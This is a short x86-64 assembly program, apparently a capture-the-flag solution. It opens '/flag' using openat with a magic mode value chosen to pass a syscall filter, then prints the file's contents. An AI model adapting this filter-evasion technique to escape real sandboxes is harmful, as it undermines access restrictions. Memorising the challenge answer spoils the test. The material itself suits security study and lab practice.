; open.asm — nasm -f elf64 open.asm -o open.o && ld -static -nostdlib open.o -o open_flag
BITS 64
default rel
section .text
global _start
_start:
    mov eax, 257            ; openat
    mov rdi, -100           ; AT_FDCWD
    lea rsi, [path]
    xor edx, edx            ; flags = O_RDONLY  (the filter requires exactly 0)
    mov r10d, 0xf289daa3    ; mode = the spell
    syscall
    mov r12, rax
.loop:
    xor eax, eax            ; read(fd, buf, 0x1000)
    mov rdi, r12
    lea rsi, [buf]
    mov edx, 0x1000
    syscall
    test rax, rax
    jle .done
    mov rdx, rax
    mov eax, 1              ; write(1, buf, n)
    mov edi, 1
    lea rsi, [buf]
    syscall
    jmp .loop
.done:
    mov eax, 60             ; exit(0)
    xor edi, edi
    syscall
path: db "/flag",0
section .bss
buf: resb 0x1000
